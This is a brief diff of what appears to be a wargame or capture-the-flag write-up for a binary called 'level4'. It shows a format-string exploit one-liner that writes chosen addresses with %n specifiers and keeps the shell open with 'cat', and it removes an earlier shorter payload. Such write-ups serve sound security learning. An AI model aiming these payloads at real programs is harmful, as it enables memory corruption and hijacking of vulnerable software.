@@ -42,5 +42,3 @@ exploit += "%? + 1 $n"			//write cible2
 ```bash
 (python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")'; cat) | ./level4
 ```
-
-\x10\x98\x04\x08%10$n
